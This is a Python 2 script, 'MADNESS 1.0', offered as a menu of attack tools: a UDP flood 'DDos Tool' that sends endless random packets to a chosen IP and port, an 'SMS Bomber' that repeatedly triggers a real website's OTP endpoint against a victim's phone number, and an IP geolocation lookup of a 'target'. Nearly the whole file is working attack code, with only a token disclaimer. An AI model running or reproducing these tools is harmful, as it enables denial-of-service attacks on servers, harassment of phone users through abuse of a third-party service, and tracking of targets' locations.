# -*- coding: utf-8 -*-
import requests
import os
import json
import colorama
from colorama import init, Fore
import time
init(autoreset=True)
import sys
import socket
import threading
import logging
import random
import urllib2, cookielib
import random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

logo = """
 (        )     (   (     
 (  `    (    )\ )  ( /(     )\ ))\ )  
 )\))(   )\  (()/(  )\())(  (()/(()/(  
((_)()((((_)( /(_))((_)\ )\  /(_))(_)) 
(_()((_)\ _ )(_))_  _((_|(_)(_))(_))    
|  \/  (_)_\(_)   \| \| | __/ __/ __|   
| |\/| |/ _ \  | |) | .` | _|\__ \__ \   
|_|  |_/_/ \_\|___/|_|\_|___|___/___/    
"""

credits = """
MADNESS 1.0
Made by TWC [The Wrecking Crew] with Evos Madness.
"""

legal = """
Notice: It is your responsibility to suffer any leg-al consequences that may follow, by any causes of using this tool.
"""
FlameGRAVE = """
▄████  █    ██   █▀▄▀█ ▄███▄     
█▀   ▀ █    █ █  █ █ █ █▀   ▀    
█▀▀    █    █▄▄█ █ ▄ █ ██▄▄      
█      ███▄ █  █ █   █ █▄   ▄▀   
 █         ▀   █    █  ▀███▀     
  ▀           █    ▀             
             ▀                   
  ▄▀  █▄▄▄▄ ██       ▄   ▄███▄   
▄▀    █  ▄▀ █ █       █  █▀   ▀  
█ ▀▄  █▀▀▌  █▄▄█ █     █ ██▄▄    
█   █ █  █  █  █  █    █ █▄   ▄▀ 
 ███    █      █   █  █  ▀███▀   
       ▀      █     █▐           
             ▀      ▐            
"""
MadSpam = """
 ▄▀▀▄ ▄▀▄  ▄▀▀█▄   ▄▀▀█▄▄           
█  █ ▀  █ ▐ ▄▀ ▀▄ █ ▄▀   █          
▐  █    █   █▄▄▄█ ▐ █    █          
  █    █   ▄▀   █   █    █          
▄▀   ▄▀   █   ▄▀   ▄▀▄▄▄▄▀          
█    █    ▐   ▐   █     ▐           
▐    ▐            ▐                 
 ▄▀▀▀▀▄  ▄▀▀▄▀▀▀▄  ▄▀▀█▄   ▄▀▀▄ ▄▀▄ 
█ █   ▐ █   █   █ ▐ ▄▀ ▀▄ █  █ ▀  █ 
   ▀▄   ▐  █▀▀▀▀    █▄▄▄█ ▐  █    █ 
▀▄   █     █       ▄▀   █   █    █  
 █▀▀▀    ▄▀       █   ▄▀  ▄▀   ▄▀   
 ▐      █         ▐   ▐   █    █    
        ▐                 ▐    ▐    
"""
SCANNIT = """
   ▄▄▄▄▄   ▄█▄    ██      ▄      ▄   ▄█    ▄▄▄▄▀ 
  █     ▀▄ █▀ ▀▄  █ █      █      █  ██ ▀▀▀ █    
▄  ▀▀▀▀▄   █   ▀  █▄▄█ ██   █ ██   █ ██     █    
 ▀▄▄▄▄▀    █▄  ▄▀ █  █ █ █  █ █ █  █ ▐█    █     
           ▀███▀     █ █  █ █ █  █ █  ▐   ▀      
                    █  █   ██ █   ██             
                   ▀                             
"""
barrier = """
___________________________________________________
"""
while True:
    os.system("printf '\033]0;logo\007'")
    os.system("clear")
    print(Fore.RED + logo)
    print(Fore.RED + credits)
    print(Fore.BLUE + legal)
    print(Fore.RED + barrier)
    print(Fore.MAGENTA + "[1] FlameGRAVE DDos Tool")
    print(Fore.CYAN + "[2] MadSpam SMS Bomber")
    print(Fore.GREEN + "[3] SCANNIT IP Lookup")
    print("[0] Exit")
    print(" ")
    x = raw_input(" Option: ").strip()

    if x == "1":
        os.system("clear")
        print(Fore.MAGENTA + FlameGRAVE)
        server_ip = raw_input(Fore.RED + "Enter Target IP: ").strip()
        port = int(raw_input(Fore.RED + "Enter Target IP Port [1-65535]: ").strip())


        os.system("clear")
        print
        print(Fore.MAGENTA + FlameGRAVE)
        print(Fore.CYAN + barrier)
        print("\033[92m")
        print("________________ATTEMPTING TO FIND SERVER_____________________")
        time.sleep(3)
        print("_________________CONNECTING TO TARGET_______________________")
        time.sleep(3)
        print("__________________CHARGING FIREBALLS________________________")
        time.sleep(3)
        print(Fore.RED + "_________________TARGET IS GETTING SWARMED!________________________")
        time.sleep(3)
        print
        print(Fore.MAGENTA + "SHOOTING FIREBALLS!. We hope you are using this for ethical purposes. Type Ctrl+C to suspend the attack.")
        time.sleep(2)
        sent = 0
        try:
            while True:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                bytes = random._urandom(1490)
                sock.sendto(bytes, (server_ip, port))
                sent = sent + 1
                port = port + 1
                print(Fore.RED + "Fireball %s shot to %s through port:%s" % (sent, server_ip, port))
                if port == 65534:
                    port = 1
        except KeyboardInterrupt:
            raw_input("\nAttack suspended. Press Enter to return to the menu...")

    if x == "2":
        os.system("clear")

        def send(num, counter, sleep):
            url = "https://www.quikr.com/SignIn?aj=1&for=send_otp&user="
            hdr = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3','Accept-Encoding': 'none','Accept-Language': 'en-US,en;q=0.8','Connection': 'keep-alive'}
            #data={"phone":num}
            result_url = url+num

            req = urllib2.Request(result_url, headers=hdr)
            for i in range(counter):
                try:
                    page = urllib2.urlopen(req)
                    print(Fore.MAGENTA + " Message sent! (Attempt {})".format(i+1))
                except urllib2.HTTPError as e:
                    print(" HTTP Error {}: {}".format(e.code, e.reason))
                except urllib2.URLError as e:
                    print("URL Error: {}".format(e.reason))
                time.sleep(sleep)

        try:
            print(Fore.CYAN + MadSpam)
            print(Fore.RED + barrier)
            number = raw_input(Fore.RED + "Enter Full Target Number [With CC]: ")
            count = raw_input(Fore.RED + "Enter number of SMS Messages: ")
            throttle = raw_input(Fore.RED + "Enter time interval: ")
            os.system("clear")
            print(Fore.CYAN + MadSpam)
            print(Fore.RED + barrier)
            print(Fore.MAGENTA + "_________________CONNECTING TO API_________________")
            time.sleep(3)
            print(" ")
            print(Fore.RED + " MAD SPAMMING STARTED! type Ctrl+C to suspend the 
SMS Bomber.")
            time.sleep(1)
            print(" ")
            send(number, int(count), int(throttle))
            raw_input(" Press Enter to return to menu...")
        except KeyboardInterrupt:
           raw_input("\nSpamming suspended. Press Enter to return to the menu...")
        finally:
            pass

    if x == "3":
        os.system("clear")
        print(Fore.GREEN + SCANNIT)
        print(Fore.RED + barrier)
        ip = raw_input(Fore.RED + "Enter Target IP address: ")
        time.sleep(1)
        os.system("clear")
        r = requests.get("http://ip-api.com/json/" + ip)
        data = r.json()
        print(Fore.GREEN + SCANNIT)
        print(Fore.RED + barrier)
        print(" ")
        print(Fore.RED + "_________________RESOLVING IP ADDRESS_________________")
        time.sleep(3)
        print(Fore.RED + "_________________SCANNING IP ADDRESS_________________")
        time.sleep(3)
        print(" ")
        print(Fore.GREEN + " IP ADDRESS SCANNED SUCCESSFULLY!")
        time.sleep(1)
        print(" ")
        print(Fore.BLUE + " Notice : Coordinates may not be 100% accurate to the exact Target's place.")
        print(" ")
        print (Fore.CYAN + " Country: " + data["country"])
        time.sleep(0.25)
        print (Fore.CYAN + " City: " + data["city"])
        time.sleep(0.25)
        print (Fore.CYAN + " Region: " + data["regionName"])
        time.sleep(0.25)
        print (Fore.CYAN + " Time Zone: " + data["timezone"])
        time.sleep(0.25)
        print (Fore.CYAN + " Coordinates [Latitude]: " + str(data["lat"]))
        time.sleep(0.25)
        print (Fore.CYAN + " Coordinates [Longitude]: " + str(data["lon"]))
        time.sleep(0.25)
        print (Fore.CYAN + " Internet company [ISP]: " + data["isp"])
        time.sleep(3)
        print(" ")
        raw_input(" Press Enter to return to menu...")

    if x == "0":
        print("Exiting...")
        break

    if x not in ["0", "1", "2", "3"]:
        print("Invalid option.")
        raw_input(" Press Enter to return to menu...")
